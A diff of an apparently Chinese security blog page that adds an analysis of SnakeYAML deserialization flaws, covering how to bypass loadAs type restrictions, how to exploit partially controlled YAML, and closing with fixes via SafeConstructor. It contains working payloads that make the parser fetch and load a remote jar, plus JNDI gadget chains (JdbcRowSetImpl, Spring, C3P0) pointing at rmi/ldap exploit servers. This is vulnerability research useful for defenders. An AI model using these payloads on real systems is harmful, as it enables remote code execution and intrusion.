@@ -356,14 +356,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    8 分
                 </div>
                 
 
@@ -495,8 +495,6 @@
 
 
 
-
-
 <p>construct——&gt;getConstructor——&gt;getClassForNode——&gt;getClassForName，可知在此方法中使用Class.forName对javax.script.ScriptEngineManager类进行加载。之后依次会对java.net.URLClassLoader、java.net.URL类使用相同的方式进行加载。</p>
 <img src="/2023/02/08/snakeyaml/16.png" class="">
 
@@ -572,6 +570,109 @@
 
 
 
+<h1 id="LoadAs反序列化漏洞分析"><a href="#LoadAs反序列化漏洞分析" class="headerlink" title="LoadAs反序列化漏洞分析"></a>LoadAs反序列化漏洞分析</h1><h2 id="指定类包含有参构造函数"><a href="#指定类包含有参构造函数" class="headerlink" title="指定类包含有参构造函数"></a>指定类包含有参构造函数</h2><p>yaml.loadAs()中已经指定待反序列化对象的类型。直接使用payload进行反序列报错。</p>
+<p>发现执行报错点在org.yaml.snakeyaml.constructor.Constructor$ConstructYamlObject.construct方法中</p>
+<img src="/2023/02/08/snakeyaml/33.png" class="">
+
+
+
+<p>跟进yaml.loadAs方法中的type在哪里起作用。</p>
+<img src="/2023/02/08/snakeyaml/34.png" class="">
+
+
+
+<p>可知，当type不为Object时，node的Tag标签会被设置成指定的类。由前面分析可知，Tag标签表示最终需要实例化的类，所以此处javax.script.ScriptEngineManager的类会被实例化为Student类，从而导致无法执行命令。</p>
+<img src="/2023/02/08/snakeyaml/35.png" class="">
+
+
+
+<p>进一步证实，查看node.setTag()后的node对象的值。可看出，最外层的tag直接为Student类，明显此处是直接替换了javax.script.ScriptEngineManager类，而后面的payload并没有发生变化。</p>
+<img src="/2023/02/08/snakeyaml/36.png" class="">
+
+
+
+<p>所以，此处想到何不在直接在最外层再套一层类，使ScriptEngineManager类在内层就执行。</p>
+<p>构造paylaod:     </p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">!</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLClassLoader</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span>java<span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token constant">URL</span> <span class="token punctuation">[</span>\"http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token number">9999</span><span class="token operator">/</span>payload<span class="token punctuation">.</span>jar\"<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>传入此payload，报错并没有执行命令。查看报错原因，大致意思是没有发现Student类一个参数的构造函数。此时反应过来，Student类只设置了无参构造函数，和两个参数的构造函数，所以需要符合构造参数的传参。</p>
+<img src="/2023/02/08/snakeyaml/37.png" class="">
+
+
+
+<p>增加一个参数后的payload。</p>
+<pre class="line-numbers language-none"><code class="language-none">!!java.lang.String [!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:9999/payload.jar\"]]]],test]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>成功执行命令。</p>
+<img src="/2023/02/08/snakeyaml/38.png" class="">
+
+
+
+<h2 id="指定类只有无参构造函数"><a href="#指定类只有无参构造函数" class="headerlink" title="指定类只有无参构造函数"></a>指定类只有无参构造函数</h2><p>仔细思考，发现上述方法只有当指定反序列化类有一个或一个以上的参数构造函数时，loadAs才能触发命令执行，当指定类只有无参构造函数时呢？所以继续进行探索。</p>
+<p>使用load的payload继续进行分析。来到constructDocument方法中。</p>
+<h1 id="入参部分可控"><a href="#入参部分可控" class="headerlink" title="入参部分可控"></a>入参部分可控</h1><p>在实际情况中yaml.load的入参可能只是yaml文件中的一部分，此时是否也可以进行反序列化呢？</p>
+<p>本地创建一个yml文件进行测试。D://setting.yml</p>
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">config</span><span class="token punctuation">:</span> 
+  <span class="token key atrule">secret</span><span class="token punctuation">:</span> <span class="token number">1860437896</span>
+  <span class="token key atrule">number</span><span class="token punctuation">:</span> <span class="token number">11111</span>
+  <span class="token key atrule">nacos</span><span class="token punctuation">:</span>
+    <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> 127.0.0.1<span class="token punctuation">:</span><span class="token number">8848</span>
+    <span class="token key atrule">namespace</span><span class="token punctuation">:</span> <span class="token tag">!!javax.script.ScriptEngineManager</span> <span class="token punctuation">[</span><span class="token tag">!!java.net.URLClassLoader</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token tag">!!java.net.URL</span> <span class="token punctuation">[</span><span class="token string">"http://127.0.0.1:9999/payload.jar"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+    <span class="token key atrule">set</span><span class="token punctuation">:</span> test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
+<h1 id="其他利用链"><a href="#其他利用链" class="headerlink" title="其他利用链"></a>其他利用链</h1><p>snakeyaml反序列化漏洞和fastjson反序列化漏洞相似，所以部分利用链可参考fastjson漏洞链</p>
+<h2 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h2><p>payload:</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> poc <span class="token operator">=</span> <span class="token string">"!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: \"rmi://127.0.0.1:1099/Exploit\", autoCommit: true}"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>调用链</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">JdbcRowSetImpl</span>#setAutoCommit
+    <span class="token class-name">JdbcRowSetImpl</span>#connect
+        <span class="token class-name">InitialContext</span>#lookup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>此处原理：yaml.load反序列化时会调用private修饰的属性的set方法。即会调用setdataSourceName、setAutocommint方法。</p>
+<h2 id="Spring-PropertyPathFactoryBean"><a href="#Spring-PropertyPathFactoryBean" class="headerlink" title="Spring PropertyPathFactoryBean"></a>Spring PropertyPathFactoryBean</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n"</span> <span class="token operator">+</span>  
+               <span class="token string">" targetBeanName: \"ldap://127.0.0.1:1389/Exploit\"\n"</span> <span class="token operator">+</span>  
+               <span class="token string">" propertyPath: Red6380\n"</span> <span class="token operator">+</span>  
+               <span class="token string">" beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n"</span> <span class="token operator">+</span>  
+               <span class="token string">"  shareableResources: [\"ldap://127.0.0.1:1389/Exploit\"]"</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="C3P0-JndiRefForwardingDataSource"><a href="#C3P0-JndiRefForwardingDataSource" class="headerlink" title="C3P0 JndiRefForwardingDataSource"></a>C3P0 JndiRefForwardingDataSource</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n"</span> <span class="token operator">+</span>  
+                <span class="token string">"  jndiName: \"rmi://127.0.0.1/Exploit\"\n"</span> <span class="token operator">+</span>  
+                <span class="token string">"  loginTimeout: 0"</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h1 id="snakeyaml反序列漏洞修复"><a href="#snakeyaml反序列漏洞修复" class="headerlink" title="snakeyaml反序列漏洞修复"></a>snakeyaml反序列漏洞修复</h1><ul>
+<li>加入new SafeConstructor()类进行过滤。此方法通过白名单的方式规定了哪些类可以进行反序列化。</li>
+</ul>
+<p>加入过滤器进行反序列化恶意类会报错。</p>
+<img src="/2023/02/08/snakeyaml/39.png" class="">
+
+
+
+<p>SafeConstructor类中定义的可反序列化的类。</p>
+<img src="/2023/02/08/snakeyaml/40.png" class="">
+
+
+
+<ul>
+<li>禁止Yaml.load()函数参数外部可控。</li>
+</ul>
+<p>参考资料</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://drun1baby.github.io/2022/10/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-SnakeYaml-%E9%93%BE/#toc-heading-17">https://drun1baby.github.io/2022/10/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-SnakeYaml-%E9%93%BE/#toc-heading-17</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90">http://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90</a></p>
+</li>
+</ul>
 
                 
             </div>
